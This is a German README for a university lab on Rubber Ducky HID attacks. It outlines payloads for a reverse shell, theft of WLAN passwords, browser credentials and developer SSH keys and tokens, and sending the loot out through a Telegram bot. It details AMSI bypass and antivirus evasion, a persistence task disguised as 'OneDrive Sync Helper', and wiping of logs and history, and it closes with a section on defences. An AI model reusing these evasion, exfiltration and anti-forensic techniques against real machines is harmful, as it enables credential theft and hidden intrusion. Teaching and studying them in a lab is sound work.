# W02a – Rubber Ducky
**System Security Lab – SS 2026 | Universitat Klagenfurt**
**Autoren: Raphael Bleier, Joachim Lugger**

---

## Dateiubersicht

| Datei | Aufgabe |
|---|---|
| `payloads/W02a1_hello_world.txt` | W02a.1 – DuckyScript: Hello World |
| `payloads/W02a2_info_gathering.txt` | W02a.2 – DuckyScript: Information Gathering |
| `payloads/W02a4_script_loader.txt` | W02a.4 – DuckyScript: Externes Script laden |
| `payloads/W02a5_reverse_shell_trigger.txt` | W02a.5 – DuckyScript: Reverse Shell |
| `payloads/W02a6_custom_attack.txt` | W02a.6 – DuckyScript: WLAN-Exfiltration |
| `payloads/W02a6_credential_steal_trigger.txt` | W02a.6 – DuckyScript: Browser Credential Stealer |
| `payloads/W02a6_devrecon_trigger.txt` | W02a.6 Advanced – DuckyScript: DevRecon |
| `scripts/info_gather.ps1` | W02a.2 – PowerShell: System-Info via Telegram |
| `scripts/reverse_shell.ps1` | W02a.5 – PowerShell: TCP Reverse Shell |
| `scripts/custom_attack.ps1` | W02a.6 – PowerShell: WLAN-Passworter via Telegram |
| `scripts/credential_stealer.ps1` | W02a.6 – PowerShell: Windows CredMan + Chromium-Credentials |
| `scripts/developer_recon.ps1` | W02a.6 Advanced – PowerShell: DevRecon Multi-Stage |

---

## Setup & Vorbereitung

### Rubber Ducky konfigurieren

1. Payload in [PayloadStudio](https://payloadstudio.hak5.org) offnen
2. **Settings → Compiler Settings → Language → `de`** setzen (Y/Z-Layout!)
3. Kompilieren → `inject.bin` auf SD-Karte kopieren

Alle Payloads (ausser W02a.5) sind **direkt einsatzbereit** – kein lokaler Server, keine IP-Konfiguration.
Die PowerShell-Scripts werden per **BITS** von GitHub geladen; Ergebnisse kommen per Telegram.

### AV-Evasion-Architektur (alle Payloads)

Jeder Payload verwendet mehrere Schutzschichten gegen Windows Defender:

| Schicht | Technik | Wirkung |
|---|---|---|
| **Loader** | `%ComSpec%` + BITS statt IEX/WebClient | Lader-Kommando selbst unverdachtig |
| **Download** | `Unblock-File` vor Ausfuhrung | Entfernt Zone.Identifier ADS (Internet-Markierung) |
| **Laufzeit** | AMSI-Bypass via Reflection (Byte-Array-kodiert) | Kein Klartext "AmsiUtils"/"amsiInitFailed" im Script |
| **Strings** | Sensitivstrings als `[byte[]]` kodiert | Kein Klartext "advapi32", "CredEnumerateW", "key=clear" etc. |
| **P/Invoke** | Dynamisch via `GetProcAddress` statt DllImport | Kein `[DllImport("advapi32")]` im Add-Type-Source |

### Nur fur W02a.5 – Reverse Shell: IP eintragen

```powershell
# scripts/reverse_shell.ps1
$ATTACKER_IP = "192.168.x.x"   # eigene IP eintragen
$PORT        = 4444
```

Committen & pushen. Dann Listener starten:
```bash
nc -lvp 4444
```

---

## W02a.1 – Rubber Ducky: Hello World

**Payload:** `payloads/W02a1_hello_world.txt`

Offnet Notepad uber den Windows Run-Dialog (`WIN+R`) und tippt `Hello World` ein.

**Ergebnis:** Notepad mit dem Text "Hello World" erscheint auf dem Zielrechner in ~3 Sekunden.

---

## W02a.2 – Rubber Ducky: Information Gathering

**Payload:** `payloads/W02a2_info_gathering.txt`
**PS-Payload:** `scripts/info_gather.ps1`

Das DuckyScript offnet PowerShell verborgen und ladt `info_gather.ps1` per BITS von GitHub in eine Temp-Datei, entfernt die Zone.Identifier-Markierung (`Unblock-File`) und fuhrt das Script aus. Danach wird die Temp-Datei sofort geloscht.

Gesammelte Informationen:
- Hostname, Benutzername, Domane
- Betriebssystem, Architektur
- IPv4-Adressen aller aktiven Interfaces
- Gespeicherte WLAN-Profilnamen

Ergebnis kommt als `.txt`-Datei per Telegram.

**Relevante Windows-Kommandos:**
```powershell
hostname
whoami
(Get-CimInstance Win32_OperatingSystem).Caption
Get-NetIPAddress -AddressFamily IPv4
netsh wlan show profiles
ipconfig /all
```

---

## W02a.3 – HID-Angriffe

### Was sind HID-Angriffe?

HID steht fur **Human Interface Device** – der USB-Standard fur Eingabegerate wie Tastaturen und Mause. Das Betriebssystem vertraut HID-Geraten automatisch und ohne Authentifizierung. Ein HID-Angriff nutzt dieses Vertrauen aus, indem ein speziell prapiertes Gerat (z.B. Rubber Ducky) als legitime Tastatur erkannt wird und mit Maschinengeschwindigkeit vorprogrammierte Tastatureingaben an das Zielsystem sendet.

**Das Kernproblem:** Das OS unterscheidet nicht zwischen einem echten Benutzer an der Tastatur und einem programmierten HID-Gerat.

### Warum konnen HID-Angriffe gefahrlich werden?

1. **Kein Vertrauensproblem auf OS-Ebene:** Tastaturen werden ohne Treiberinstallation oder Berechtigungsabfrage akzeptiert.
2. **Geschwindigkeit:** Ein Rubber Ducky tippt hunderte Zeichen pro Sekunde. Ein vollstandiger Angriff kann in unter 10 Sekunden abgeschlossen sein.
3. **Kein Malware-Fingerabdruck:** Antivirenprogramme erkennen keine schadliche Datei, weil nur Tastatureingaben injiziert werden – vorhandene Systemmittel (PowerShell, cmd) werden genutzt.
4. **Universell:** Funktioniert auf Windows, Linux und macOS mit minimalen Anpassungen.
5. **Physischer Zugang reicht:** Kurzzeitiger unbeaufsichtigter Zugang genugt.

### Arten von HID-Angriffen

| Angriff | Beschreibung |
|---|---|
| **Keystroke Injection** | Direktes Eintippen von Befehlen (Rubber Ducky, O.MG Cable) |
| **BadUSB** | Modifizierte USB-Firmware tauscht verschiedene Gerateklassen vor |
| **Bash Bunny** | Kombiniert HID mit Netzwerk-Adapter und Mass Storage |
| **Mousejack** | Drahtlose HID-Angriffe uber unverschlusselte 2,4-GHz-Protokolle |
| **Flipper Zero BadUSB** | Portable Variante mit DuckyScript-Unterstutzung |

### Schutzempfehlungen

**Verhaltensmasnahmen:**
- Unbekannte USB-Gerate niemals einstecken
- Computer beim Verlassen immer sperren (`WIN+L`)
- Keine Fundgerate anschliessen (USB-Drop-Angriff)

**Technische Masnahmen** (Details unter W02a.7):
- USB-Port-Sperren per Gruppenrichtlinie (GPO)
- USBGuard (Linux)
- EDR mit HID-Anomalieerkennung

---

## W02a.4 – Rubber Ducky: Externes Script laden & ausfuhren

**Payload:** `payloads/W02a4_script_loader.txt`

Das DuckyScript ladt das Ziel-Script per **BITS** (Background Intelligent Transfer Service – Windows Update-Dienst) von GitHub und fuhrt es aus. BITS ist ein legitimer Windows-Systemdienst und wird von AV selten geflaggt.

```
Rubber Ducky eingesteckt
  -> WIN+R -> %ComSpec% /c powershell -nop -ep bypass -w h -c "..."
  -> Import-Module BitsTransfer; Start-BitsTransfer (URL -> %TEMP%\r.ps1)
  -> Unblock-File %TEMP%\r.ps1        (Zone.Identifier ADS entfernen)
  -> & %TEMP%\r.ps1                   (Script ausfuhren)
  -> Remove-Item %TEMP%\r.ps1         (Datei loeschen)
```

Die Temp-Datei existiert nur kurz wahrend der Ausfuhrung und wird danach sofort geloscht.

---

## W02a.5 – Rubber Ducky: Reverse Shell

**Payload:** `payloads/W02a5_reverse_shell_trigger.txt`
**PS-Payload:** `scripts/reverse_shell.ps1`

### Wie funktioniert eine Reverse Shell?

Bei einer regularen Shell verbindet sich Angreifer → Opfer (eingehend, von Firewalls geblockt).
Bei einer Reverse Shell verbindet sich das Opfer → Angreifer (ausgehend, typischerweise erlaubt):

```
Angreifer-Maschine           Opfer-Maschine
nc -lvp 4444  <---------  TCP-Verbindung  <----  reverse_shell.ps1
(wartet)                                          (lauft versteckt)
      |          Interaktive Shell          |
```

### Voraussetzungen

1. `nc -lvp 4444` auf Angreifer-Maschine starten
2. `$ATTACKER_IP` und `$PORT` in `reverse_shell.ps1` eintragen, committen, pushen
3. Opfer muss den Angreifer-Host uber das Netz erreichen konnen

### Erkennung & Gegenmasnahmen

| Methode | Beschreibung |
|---|---|
| **Ausgehende Firewall-Regeln** | Nur bekannte Ports (80, 443) erlauben |
| **IDS/IPS** | Erkennt ungewohnliche ausgehende Verbindungen |
| **EDR/Antivirus** | Erkennt bekannte Reverse-Shell-Muster in PS |
| **PS Script Block Logging** | Alle ausgefuhrten PS-Blocke protokollieren |
| **AMSI** | Anti-Malware Scan Interface pruft PS-Code vor Ausfuhrung |
| **Netzwerk-Monitoring** | Neue Ziel-IP auf ungewohnlichem Port |

---

## W02a.6 – Rubber Ducky: WLAN-Passwort-Exfiltration

**Payload:** `payloads/W02a6_custom_attack.txt`
**PS-Payload:** `scripts/custom_attack.ps1`

### Vorgehensweise

1. Rubber Ducky offnet PowerShell im Hidden-Modus
2. `netsh wlan export profile key=clear folder="%TEMP%"` exportiert alle WLAN-Profile als XML mit **Klartextpasswortern** ins TEMP-Verzeichnis
3. PowerShell parst die XMLs und extrahiert SSID + Passwort
4. Ergebnisliste kommt als `.txt`-Datei per Telegram
5. Exportierte XMLs werden geloscht

**Warum gefahrlich:** `netsh wlan export profile key=clear` benotigt **keine Administrator-Rechte** und liefert alle gespeicherten WLAN-Passworter im Klartext. Standardfeature von Windows.

### Zeitlicher Ablauf

| Zeit | Aktion |
|---|---|
| 0s | Rubber Ducky eingesteckt |
| 2s | PowerShell gestartet (verborgen) |
| 3s | WLAN-Export ins TEMP-Verzeichnis |
| 5s | Passworter extrahiert & per Telegram versendet |
| 6s | XML-Dateien geloscht |

---

## W02a.6 – Rubber Ducky: Browser Credential Stealer

**Payload:** `payloads/W02a6_credential_steal_trigger.txt`
**PS-Payload:** `scripts/credential_stealer.ps1`

### Was wird gesammelt?

| Quelle | Methode | Ohne Admin? |
|---|---|---|
| **Windows Credential Manager** | Dynamisches P/Invoke (CredEnumerateW) | Ja |
| **Chrome/Edge/Brave – Passworter** | SQLite via winsqlite3.dll + DPAPI/AES-GCM | Ja |
| **Chrome/Edge/Brave – Cookies** | SQLite via winsqlite3.dll + DPAPI/AES-GCM | Ja |
| **Firefox** | logins.json (NSS-verschluesselt, Metadaten lesbar) | Ja |

### AV-Evasion-Details

Der Credential Stealer hat die aggressivste Evasion-Implementierung aller Scripts:

- **Kein `[DllImport("advapi32")]`** – Die Strings "advapi32", "CredEnumerateW", "CredFree" erscheinen nie als Klartext
- **Dynamisches P/Invoke**: `LoadLibrary` + `GetProcAddress` (nur kernel32 in DllImport) + `GetDelegateForFunctionPointer`
- **Byte-Array-kodierte Pfade**: "Login Data", "Local State", "Network\Cookies" nur als `[byte[]]` im Script
- **Fallback**: Falls P/Invoke fehlschlagt, `cmdkey /list` als Alternative

### Passworter entschluesseln (Chromium)

Chrome v80+ verschlusselt Passworter mit AES-256-GCM. Der Master Key liegt DPAPI-verschlusselt in `Local State`:

```
Local State (JSON)
  -> os_crypt.encrypted_key (Base64)
  -> [5..] DPAPI-Blob
  -> ProtectedData.Unprotect() -> 32-Byte AES-Key
  -> AES-GCM-Decrypt(IV=Blob[3..14], Ciphertext, AuthTag) -> Klartext
```

**Hinweis:** AES-GCM-Entschlusselung benotigt .NET 5+ (PowerShell 7/pwsh). Unter PS5.1 werden v10/v11-Passworter als `(AES-GCM - benoetigt PS7/pwsh)` angezeigt.

---

## W02a.7 – Absicherung gegen Rubber Ducky

### 1. USB-Gerate-Whitelisting per GPO

Windows erlaubt Sperren per Vendor ID (VID) und Product ID (PID):

```
Computerkonfiguration -> Administrative Vorlagen
  -> System -> Wechselmediumzugriff
  -> "Wechselmedien: Alle Klassen verweigern" = Aktiviert
```

Oder gezielt fur HID (Klassen-GUID `{745a17a0-74d3-11d0-b6fe-00a0c90f57da}`):
```
Computerkonfiguration -> Administrative Vorlagen -> System -> Geratekonfiguration
  -> Gerate-Installation nach Gerateinstallations-GUIDs einschranken
```

### 2. USBGuard (Linux)

Whitelist-basiert – neue USB-Gerate werden blockiert bis explizit freigegeben:
```bash
usbguard generate-policy > /etc/usbguard/rules.conf
usbguard enforce-policy
```

### 3. Rapid Keystroke Detection

Rubber Ducky tippt ~1000 Zeichen/Sekunde – weit uber menschliche Moglichkeiten. Software die Tastatureingabegeschwindigkeit uberwacht kann HID-Angriffe erkennen und blockieren.

### 4. Endpoint Detection & Response (EDR)

Moderne EDR-Losungen erkennen:
- Ungewohnliche Prozessaufrufe direkt nach USB-Verbindung
- PowerShell mit `-ExecutionPolicy Bypass` und `Invoke-Expression`
- Netzwerkverbindungen aus PowerShell-Prozessen

### 5. Physische USB-Port-Sperren

Physische Kunststoff-Stecker in freie USB-Ports, die sich nur mit Spezialwerkzeug entfernen lassen. Verhindert das physische Einstecken.

### 6. BIOS/UEFI-Konfiguration

- USB-Ports im BIOS deaktivieren (ausser Maus/Tastatur)
- Secure Boot aktivieren
- BIOS-Passwort setzen

### 7. WDAC / AppLocker

Verhindert Ausfuhrung unbekannter Prozesse. Blockiert z.B. ungezieltes `IEX`-basiertes Nachladen von externen Payloads.

### Vergleich der Methoden

| Methode | Aufwand | Schutzlevel | Seiteneffekte |
|---|---|---|---|
| GPO USB-Whitelist | Mittel | Hoch | Neue Gerate mussen freigegeben werden |
| USBGuard (Linux) | Gering | Hoch | Workflow-Anpassung notig |
| Keystroke Detection | Hoch | Mittel | False Positives moglich |
| EDR | Mittel (Lizenz) | Hoch | Systemressourcen |
| Physische Sperren | Gering | Sehr hoch | Flexibilitat eingeschrankt |
| BIOS-Deaktivierung | Gering | Sehr hoch | Stark eingeschrankte USB-Nutzung |

---

## W02a.6 Advanced – "DevRecon" – Developer Credential Harvester

> Eigener kreativer Angriff: kombiniert Stealth, Living-off-the-Land, gezieltes Credential-Harvesting und automatische Persistenz.

**Dateien:**
- `payloads/W02a6_devrecon_trigger.txt` – Stage 1: DuckyScript (Trigger)
- `scripts/developer_recon.ps1` – Stage 2: PowerShell Multi-Stage Payload

### Angriffsziel

Entwickler-Maschinen enthalten haufig:
- **SSH Private Keys** (`~/.ssh/id_rsa`, `id_ed25519`) → direkter Zugang zu Servern
- **`.git-credentials`** → GitHub/GitLab OAuth-Tokens im **Klartext** (Windows-Standard)
- **GitHub CLI Token** (`hosts.yml`) → vollstandiger API-Zugriff auf alle Repos
- **`.gitconfig`** → Name, E-Mail, konfigurierter Credential Helper

Ein einziger GitHub-Token kann tausende private Repositories, CI/CD-Pipelines und Produktionsdeploys kompromittieren.

### Angriffs-Architektur

```
[Rubber Ducky eingesteckt]
        |
        v  ~2 Sekunden
[Stage 1: DuckyScript]
  WIN+R -> %ComSpec% /c powershell -nop -ep bypass -w h
  BitsTransfer: GitHub -> %TEMP%\r.ps1
  Unblock-File + Ausfuehren + Loeschen
        |
        v  Temp-Datei existiert nur kurz
[Stage 2: developer_recon.ps1]
        |
        +-> AMSI-Bypass (obfuskiert, keine Klartextstrings)
        |
        +-> RECON:   SSH Keys + .git-credentials + .gitconfig + GitHub CLI Token
        |
        +-> EXFIL:   Telegram Bot (HTTPS Port 443)
        |
        +-> PERSIST: Scheduled Task "OneDrive Sync Helper"
        |            Wochentlich, versteckt, kein Admin notig
        |            BitsTransfer von GitHub (kein IEX/WebClient)
        |
        +-> OPSEC:   PS-History loschen, Recent Files leeren, Temp aufraeumen
```

### Exfiltrations-Kanal: Telegram Bot

| Eigenschaft | Vorteil |
|---|---|
| Traffic zu `api.telegram.org:443` | HTTPS, uberall erlaubt |
| Kein eigener Server | Keine verdachtige IP, keine Infrastruktur |
| Kein Token auf Opfer-Seite notig | Bot-Token ist im Script – Opfer sieht ihn nicht |
| Datei-Upload per `sendDocument` | Grosse Ergebnisdateien moglich |

### Phasen im Detail

**Phase 1 – Recon:** Liest SSH-Keys, `.git-credentials`, `.gitconfig` und GitHub CLI `hosts.yml` aus.
Nutzt nur Windows-Bordmittel (`Get-Content`, `Test-Path`, `cmdkey`).

**Phase 2 – Exfil:** Sendet alles als `.txt`-Datei per Telegram `sendDocument`.

**Phase 3 – Persistenz:** Legt Scheduled Task "OneDrive Sync Helper" an (kein Admin notig).
Task ladt das Script wochentlich direkt von GitHub nach – selbst-aktualisierend.

**Phase 4 – OPSEC:**
- PS-History-Datei geloscht
- In-Memory-History geleert (falls interaktive Session)
- `%APPDATA%\Microsoft\Windows\Recent\*` geloscht
- Temp-XML-Dateien geloscht
- Windows PowerShell Event Log geleert (erfordert Admin – scheitert bei normalem User still)

### Gegen welche Abwehrmassnahmen ist DevRecon resistent?

| Abwehr | Resistent? | Warum |
|---|---|---|
| Antivirus (Signatur-basiert) | Ja | Keine Klartextstrings, nur Byte-Arrays; kein IEX/WebClient |
| Firewall (eingehend) | Ja | Keine eingehende Verbindung notig |
| Firewall (ausgehend) | Ja | HTTPS Port 443 zu Telegram – uberall erlaubt |
| AMSI | Ja | Bypass via Reflection mit obfuskierten Strings |
| EDR (Verhaltens-basiert) | Teilweise | BITS statt IEX; SSH-Key-Zugriff verhaltensbasiert erkennbar |
| PS Script Block Logging | Teilweise | Logs werden nach Ausfuhrung geleert |
| Netzwerk-Monitoring | Ja | Normaler HTTPS-Traffic zu api.telegram.org |

---

## Erfahrungen & Beobachtungen im Labor

*(Wahrend der Laborubung ausfullen)*

| Aufgabe | Funktioniert? | Zeitbedarf | Anmerkungen |
|---|---|---|---|
| W02a.1 Hello World | | | |
| W02a.2 Info Gathering | | | |
| W02a.4 Script Loader | | | |
| W02a.5 Reverse Shell | | | |
| W02a.6 Custom Attack | | | |
| W02a.6 DevRecon | | | |

**Allgemeine Feststellungen:**
- Trellix Endpoint Security: Hat wahrend der Ubungen angeschlagen? (Ja/Nein)
- Sprachprobleme (Y/Z): Wurden Compiler-Settings auf `de` gesetzt?
- Telegram-Empfang: Nachrichten angekommen?
